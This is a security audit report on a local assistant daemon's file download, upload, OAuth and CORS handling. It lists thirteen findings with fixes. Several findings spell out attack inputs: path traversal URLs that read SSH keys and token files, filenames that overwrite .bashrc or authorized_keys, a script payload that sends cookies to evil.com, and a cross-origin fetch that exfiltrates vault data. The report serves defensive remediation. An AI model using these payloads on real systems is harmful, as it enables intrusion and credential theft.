# Security Audit: Vault-Stored Documents & File Download System

**Date:** 2026-03-16
**Scope:** Document download endpoints, content attachment system, file serving, and related authentication/authorization mechanisms.
**Files reviewed:**
- `src/daemon/api-routes.ts` — All REST API route handlers
- `src/daemon/index.ts` — Daemon startup and auth wiring
- `src/comms/websocket.ts` — HTTP server, auth middleware, static file serving
- `src/vault/content-pipeline.ts` — Content attachment CRUD
- `src/vault/documents.ts` — Vault-stored document CRUD
- `ui/src/components/pipeline/PipelineAttachments.tsx` — Frontend attachment component
- `ui/src/hooks/useApi.ts` — Frontend API helper

---

## Vulnerability Summary

| #  | Severity     | Category                  | Location                                      |
|----|-------------|---------------------------|-----------------------------------------------|
| 1  | **CRITICAL** | Path Traversal (Read)     | `api-routes.ts:777-788` — file download       |
| 2  | **CRITICAL** | Path Traversal (Write)    | `api-routes.ts:747-748` — file upload          |
| 3  | **HIGH**     | Auth Bypass (Default Off) | `index.ts:476-482` — optional auth token       |
| 4  | **HIGH**     | Reflected XSS             | `api-routes.ts:797-802` — OAuth callback       |
| 5  | **HIGH**     | Reflected XSS             | `api-routes.ts:833-836` — OAuth error display  |
| 6  | **HIGH**     | Overly Permissive CORS    | `api-routes.ts:83-87` — wildcard origin        |
| 7  | **MEDIUM**   | Missing File Existence Check | `api-routes.ts:783` — download response     |
| 8  | **MEDIUM**   | Broken Access Control     | `api-routes.ts:768-769` — attachment delete    |
| 9  | **MEDIUM**   | Insecure Cookie Flags     | `websocket.ts:154` — Set-Cookie               |
| 10 | **MEDIUM**   | Unrestricted Upload Size  | `api-routes.ts:729-764` — file upload          |
| 11 | **MEDIUM**   | Unrestricted File Type    | `api-routes.ts:729-764` — file upload          |
| 12 | **LOW**      | Content-Disposition Injection | `api-routes.ts:1698` — workflow export    |
| 13 | **LOW**      | LIKE Wildcard Injection   | `content-pipeline.ts:129`, `documents.ts:82,86` |

---

## Detailed Findings

### 1. CRITICAL — Path Traversal on Content File Download

**Location:** `src/daemon/api-routes.ts:777-788`
**Endpoint:** `GET /api/content/files/:contentId/:filename`

**Description:**
Both the `contentId` and `filename` URL parameters are passed directly to `path.join()` without any sanitization. An attacker can use `..` sequences to escape the intended `~/.jarvis/content/` directory and read arbitrary files from the filesystem.

**Attack vectors:**
- `GET /api/content/files/..%2F..%2F.ssh/id_rsa` — read SSH private key
- `GET /api/content/files/foo/..%2F..%2F..%2Fetc%2Fpasswd` — read system files
- `GET /api/content/files/foo/..%2F..%2F.jarvis%2Fgoogle-tokens.json` — steal OAuth tokens
- `GET /api/content/files/foo/..%2F..%2F.jarvis%2Fjarvis.db` — exfiltrate the entire database

**Impact:** Complete filesystem read access under the daemon's user privileges. Exposure of credentials, private keys, configuration files, and database.

**Fix:**
1. Sanitize both `contentId` and `filename` by stripping or rejecting any path separator characters (`/`, `\`) and `..` sequences.
2. Use `path.basename()` on both parameters before constructing the path.
3. After constructing the full path with `path.resolve()`, verify it starts with the expected base directory (`~/.jarvis/content/`). Reject the request if it does not.
4. Check that the file exists before returning a response.

---

### 2. CRITICAL — Path Traversal on Content File Upload

**Location:** `src/daemon/api-routes.ts:747-748`
**Endpoint:** `POST /api/content/:id/attachments`

**Description:**
The `file.name` property from the uploaded `FormData` is attacker-controlled and used directly in `path.join()` to determine the write destination. A crafted filename containing `../` can write files to arbitrary locations on disk.

**Attack vectors:**
- Upload a file named `../../../.bashrc` to overwrite the user's shell config, achieving code execution on next shell session.
- Upload a file named `../../../.ssh/authorized_keys` to inject an SSH public key.
- Upload a file named `../../../.jarvis/config.yaml` to replace JARVIS configuration.

**Impact:** Arbitrary file write on the filesystem. Can lead to remote code execution through overwriting of shell configs, cron jobs, or other auto-executed files.

**Fix:**
1. Apply `path.basename()` to `file.name` to strip all directory components.
2. Reject filenames that are empty after sanitization or that consist only of dots.
3. Optionally generate a safe filename (e.g., UUID + original extension) instead of trusting user-supplied names.
4. After constructing the final path with `path.resolve()`, verify it remains within `~/.jarvis/content/<contentId>/`.

---

### 3. HIGH — Authentication is Optional (Default Off)

**Location:** `src/daemon/index.ts:476-482`, `src/comms/websocket.ts:140-167`

**Description:**
The auth token is loaded from `config.auth.token`. If this field is not set in the user's `config.yaml` (which is the default), the entire API surface — including all file operations, document CRUD, authority/emergency controls, screen captures, and configuration endpoints — is accessible without any authentication.

The daemon explicitly logs a warning but proceeds to serve everything unauthenticated:
```
[Daemon] No auth token configured — dashboard is open to anyone on the network
```

**Impact:** Any device on the same network (or any process on localhost) can access, modify, and delete all data. In cloud/shared environments, this is especially dangerous.

**Fix:**
1. Auto-generate a random auth token on first run if none is configured, and persist it to the config file.
2. Print the generated token to the console so the user can use it.
3. Alternatively, require the token to be set before the daemon will start, or bind to `127.0.0.1` only when no token is configured.

---

### 4. HIGH — Reflected XSS in Google OAuth Callback (Error Parameter)

**Location:** `src/daemon/api-routes.ts:797-802`
**Endpoint:** `GET /api/auth/google/callback?error=<payload>`

**Description:**
The `error` query parameter from the Google OAuth callback is interpolated directly into an HTML response without any escaping. An attacker can craft a URL containing a malicious script payload and trick a user into visiting it.

**Attack vector:**
```
/api/auth/google/callback?error=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

Note: This endpoint is in the `isPublicRoute` list implicitly (it's not, but it doesn't matter — the OAuth callback must be publicly accessible for Google's redirect to work).

**Impact:** Arbitrary JavaScript execution in the user's browser in the context of the JARVIS domain. Can steal session cookies (especially since `HttpOnly` is not set — see #9), exfiltrate data, or perform actions as the user.

**Fix:**
HTML-encode all special characters (`<`, `>`, `"`, `'`, `&`) in the `authError` value before injecting it into the HTML response. Use a function like:
```typescript
function escapeHtml(str: string): string {
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
```

---

### 5. HIGH — Reflected XSS in Google OAuth Callback (Error Message)

**Location:** `src/daemon/api-routes.ts:833-836`
**Endpoint:** `GET /api/auth/google/callback` (token exchange error path)

**Description:**
When the OAuth token exchange fails, the error message is inserted into a `<pre>` tag without HTML escaping. If the error message contains user-influenced data (e.g., a crafted authorization code that triggers a specific error string), it could be exploited.

**Impact:** Same as #4 — arbitrary JavaScript execution.

**Fix:** Apply the same HTML-escaping function to the error message `msg` before inserting it into the HTML response.

---

### 6. HIGH — Overly Permissive CORS (Wildcard Origin)

**Location:** `src/daemon/api-routes.ts:83-87`, `src/comms/websocket.ts:189-196`

**Description:**
All API responses include `Access-Control-Allow-Origin: *`. This allows any website to make cross-origin requests to the JARVIS API and read the full response. Combined with the cookie-based auth (SameSite=Lax still sends cookies on top-level navigations) and the absence of CSRF protection, this enables cross-origin data theft.

**Attack vector:**
A malicious website visited by the user runs:
```javascript
fetch('http://localhost:3142/api/vault/search?q=password')
  .then(r => r.json())
  .then(data => exfiltrate(data));
```
With `Access-Control-Allow-Origin: *`, the browser allows the response to be read.

**Impact:** Any website can silently exfiltrate all vault data, documents, screen captures with OCR text, conversations, configuration, and tokens.

**Fix:**
1. Replace the wildcard `*` with the specific expected origin (e.g., `http://localhost:3142` or the configured dashboard URL).
2. If the dashboard is always served from the same origin, CORS headers may not be needed at all for API routes.
3. For the OAuth callback and webhook endpoints that may need external access, apply CORS selectively only to those routes.

---

### 7. MEDIUM — Missing File Existence Check on Download

**Location:** `src/daemon/api-routes.ts:783`
**Endpoint:** `GET /api/content/files/:contentId/:filename`

**Description:**
The file download endpoint creates a `Bun.file()` reference and immediately returns it as a `Response` without checking whether the file exists. While Bun may handle this gracefully by returning an error, the behavior is implementation-dependent and may leak information through error messages or timing differences.

**Impact:** Information disclosure through error messages; potential for unexpected server behavior.

**Fix:**
Check `await file.exists()` before returning the response. Return a proper 404 JSON error if the file does not exist.

---

### 8. MEDIUM — Broken Access Control on Attachment Deletion

**Location:** `src/daemon/api-routes.ts:767-775`
**Endpoint:** `DELETE /api/content/:id/attachments/:aid`

**Description:**
The delete endpoint accepts any attachment ID (`aid`) without verifying it belongs to the content item specified by `:id`. The `contentId` in the URL is only used for broadcasting the update notification, not for authorization. An attacker can delete any attachment in the system by guessing or enumerating attachment IDs.

**Impact:** Unauthorized deletion of attachments belonging to other content items.

**Fix:**
Before deleting, query the attachment and verify that its `content_id` matches `req.params.id`. Return 404 if they don't match. This also applies to the `getAttachments()` call — though it already filters by `contentId`, the delete does not.

---

### 9. MEDIUM — Insecure Cookie Flags

**Location:** `src/comms/websocket.ts:154`

**Description:**
The auth token cookie is set with only `Path=/; SameSite=Lax`. It is missing:
- `HttpOnly` — JavaScript running in the browser can read `document.cookie` and steal the token. This directly compounds the XSS vulnerabilities (#4, #5).
- `Secure` — The cookie is sent over plain HTTP, making it interceptable on the network via MITM attacks.

**Impact:** Token theft via XSS or network interception.

**Fix:**
Set the cookie with all security flags:
```
Set-Cookie: token=<value>; Path=/; SameSite=Lax; HttpOnly; Secure
```
Note: `Secure` should only be added if HTTPS is in use or planned. For localhost-only development, `HttpOnly` alone is the priority fix.

---

### 10. MEDIUM — No Upload Size Limit

**Location:** `src/daemon/api-routes.ts:729-764`
**Endpoint:** `POST /api/content/:id/attachments`

**Description:**
The file upload endpoint does not enforce any maximum file size. An attacker (or a misbehaving client) can upload arbitrarily large files, exhausting disk space or memory during processing.

**Impact:** Denial of service through disk exhaustion.

**Fix:**
1. Check `file.size` before writing to disk. Reject files exceeding a configurable maximum (e.g., 50MB).
2. Optionally, configure Bun.serve's `maxRequestBodySize` to enforce a global limit at the server level.

---

### 11. MEDIUM — No File Type Restriction on Upload

**Location:** `src/daemon/api-routes.ts:729-764`
**Endpoint:** `POST /api/content/:id/attachments`

**Description:**
The upload endpoint accepts any file type without validation. Combined with the path traversal vulnerability (#2), this could allow uploading executable files. Even without the path traversal, serving user-uploaded HTML or SVG files through the download endpoint could enable stored XSS if the browser renders them inline.

**Impact:** Stored XSS if HTML/SVG files are served with their native MIME type; potential for executable uploads.

**Fix:**
1. Maintain an allowlist of permitted MIME types, or at minimum a denylist blocking `text/html`, `application/javascript`, `image/svg+xml`, and similar executable types.
2. On the download endpoint, set `Content-Disposition: attachment` to force downloads instead of inline rendering.
3. Set `X-Content-Type-Options: nosniff` on all responses to prevent MIME-type sniffing.

---

### 12. LOW — Content-Disposition Header Injection

**Location:** `src/daemon/api-routes.ts:1698`
**Endpoint:** `GET /api/workflows/:id/export`

**Description:**
The workflow name `wf.name` is inserted into the `Content-Disposition` header without sanitization:
```typescript
`attachment; filename="${wf.name}.yaml"`
```
If a workflow name contains a double-quote or newline characters, it could break the header structure. While modern browsers handle this reasonably, it is a violation of RFC 6266 and could cause issues with certain HTTP clients or proxies.

The same pattern appears in the document download endpoint (`api-routes.ts:2086-2091`), though the filename there is sanitized via regex to strip non-alphanumeric characters.

**Impact:** Minor — potential header injection, malformed download filenames.

**Fix:**
Sanitize `wf.name` by stripping or encoding characters that are invalid in the `filename` parameter (`"`, `\`, newlines, and non-ASCII characters). Apply the same regex sanitization that the document download endpoint already uses.

---

### 13. LOW — LIKE Wildcard Injection in Tag/Search Queries

**Location:**
- `src/vault/content-pipeline.ts:129` — content tag search
- `src/vault/documents.ts:82` — document tag search
- `src/vault/documents.ts:86` — document body/title search

**Description:**
User-supplied values are interpolated into SQL `LIKE` patterns without escaping the `%` and `_` wildcard characters. While SQL injection is prevented by parameterized queries, an attacker can use `%` and `_` characters in tag or search values to craft overly broad match patterns, potentially returning more results than intended.

**Impact:** Minor — unintended query broadening, no data modification risk.

**Fix:**
Escape `%` and `_` in user-supplied values before using them in LIKE patterns:
```typescript
function escapeLike(s: string): string {
  return s.replace(/[%_\\]/g, '\\$&');
}
// Usage: params.push(`%"${escapeLike(query.tag)}"%`);
```

---

## Additional Observations

### Document Download Endpoint is Well-Designed

The new vault-stored documents system (`/api/documents/:id/download` at `api-routes.ts:2067-2096`) is **not vulnerable to path traversal** because:
- Document content is stored in the SQLite database, not on disk.
- The download serves `doc.body` (a string from the DB), not a filesystem path.
- The filename in `Content-Disposition` is sanitized via regex: `doc.title.replace(/[^a-zA-Z0-9_\- ]/g, '')`.

This is a good pattern that the content attachment system should also follow.

### Screen Capture Image Endpoints

The capture image endpoints (`/api/awareness/captures/:id/image` and `.../thumbnail`) serve files from absolute paths stored in the database. The capture ID is looked up in the DB, and the stored `image_path` is used to read the file. This is **not directly exploitable** through the API, but if an attacker could manipulate the database (e.g., through another vulnerability), they could cause these endpoints to serve arbitrary files. Consider validating that `image_path` resides within expected directories.

### `postMessage` Wildcard Origin

In `api-routes.ts:825`:
```javascript
window.opener.postMessage('google-auth-complete', '*');
```
The `*` target origin means the message is sent to any window, regardless of origin. If the popup was opened from a malicious page, that page receives the message. The impact is low since the message content is static, but best practice is to specify the expected origin.

---

## Prioritized Remediation Order

1. **Path Traversal on Download (#1)** — Immediate. Enables reading any file on the system.
2. **Path Traversal on Upload (#2)** — Immediate. Enables writing to any location on disk.
3. **Reflected XSS (#4, #5)** — High priority. Enables session hijacking.
4. **CORS Wildcard (#6)** — High priority. Enables cross-origin data theft.
5. **Optional Auth (#3)** — High priority. All above are worse when auth is absent.
6. **Cookie Flags (#9)** — Fixes compound with XSS.
7. **Upload Restrictions (#10, #11)** — Prevents DoS and stored XSS.
8. **Attachment Delete ACL (#8)** — Access control fix.
9. **File Existence Check (#7)** — Defensive hardening.
10. **Header Injection (#12)** and **LIKE Wildcards (#13)** — Low priority cleanup.
